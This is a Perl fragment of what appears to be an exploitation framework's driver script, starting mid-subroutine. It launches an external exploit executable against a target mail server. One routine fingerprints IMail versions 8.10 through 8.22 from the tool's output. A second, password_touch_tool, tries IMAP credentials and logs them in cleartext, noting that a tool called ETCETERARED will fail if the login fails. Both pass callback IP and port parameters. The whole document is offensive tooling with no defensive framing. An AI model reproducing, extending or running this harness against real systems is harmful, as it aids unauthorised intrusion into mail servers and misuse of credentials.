my ($root_dir,$SocketIp,$ProbePort, $protocol, $TimeOutValue, $RealIp, $RealPort) = @_;
	my $handle = new FileHandle;

	my $ProbeError  = 1;			
	my $not			= "NOT GOOD";
    my $imail810	= "8.10";
	my $imail811	= "8.11";
	my $imail812    = "8.12";
	my $imail813	= "8.13";
	my $imail813EVAL= "8.13 EVAL";
	my $imail814	= "8.14";
	my $imail815	= "8.15";
	my $imail821	= "8.21";
	my $imail822	= "8.22";

	my $MachineType = $not;

	my $cmdline = "\"$root_dir\\$::EXPLOIT_EXE\" -r 2 -i $SocketIp -p $ProbePort -o $TimeOutValue -t $protocol -X $RealIp -x $RealPort";
	&EU_Log(1, "$cmdline");

	&EU_Log(1, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::EXPLOIT_EXE This error");
	}
	
	my $line;
	my $host;

	while(<$handle>)
	{
		chomp($line = $_);
		&EU_Log(1, "$line");


		if($line =~ /Hostname/) {
			my $retval = "";
			($retval, $host) = split /=/, $line, 2;
			&EU_Log(1, "Found the hostname: $host");
		}



		if($line =~ /$imail810/) {
			$MachineType	= $imail810;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		elsif($line =~ /$imail811/) {
			$MachineType	= $imail811;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		elsif($line =~ /$imail812/) {
			$MachineType	= $imail812;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		elsif($line =~ /$imail813EVAL/) {
			$MachineType	= $imail813EVAL;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		elsif($line =~ /$imail813/) {
			$MachineType	= $imail813;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		elsif($line =~ /$imail814/) {
			$MachineType	= $imail814;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		elsif($line =~ /$imail815/) {
			$MachineType	= $imail815;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		elsif($line =~ /$imail821/) {
			$MachineType	= $imail821;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		elsif($line =~ /$imail822/) {
			$MachineType	= $imail822;
			$ProbeError		= 0;
			return($MachineType, $host, $ProbeError);
		}
		else {
			$MachineType = $not;
		}
	}

	&EU_Log(1, "Machine Type is $MachineType" );
	return ($MachineType, $host, $ProbeError); 
}

sub password_touch_tool() {

my ($root_dir,$SocketIp,$ProbeIMAPPort, $protocol, $TimeOutValue, $user, $password, $RealIp, $RealPort) = @_;
	my $handle = new FileHandle;

	my $ProbeError  = 1;			
      
	my $cmdline = "\"$root_dir\\$::EXPLOIT_EXE\" -r 3 -i $SocketIp -p $ProbeIMAPPort -o $TimeOutValue -n $user -a $password -t $protocol -X $RealIp -x $RealPort";
	&EU_Log(1, "$cmdline");

	&EU_Log(1, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::EXPLOIT_EXE This error");
	}
	
	my $line;
	my $host;

	while(<$handle>)
	{
		chomp($line = $_);
		&EU_Log(1, "$line");

		if($line =~ /Hostname/) {
			my $retval = "";
			($retval, $host) = split /=/, $line, 2;
			&EU_Log(1, "Found the hostname: $host");
		}
		elsif($line =~ /Login was successful/) {
			$ProbeError		= 0;
			&EU_Log(1, "Login as $user / $password was successful." );
			return ($host, $ProbeError);
		}
		elsif($line =~ /Login failed/) {
			$ProbeError		= 1;
			&EU_Log(1, "Login as $user / $password failed.  ETCETERARED will fail." );
			return ($host, $ProbeError);
		}
		else {
			&EU_Log(1, "Received unknown result.  Login as $user / $password may fail." );
			&EU_Log(1, "The unknown message was: $line" );
			$ProbeError		= 1;
			return ($host, $ProbeError);
		}
	}

	return ($host, $ProbeError); 
}


__END__



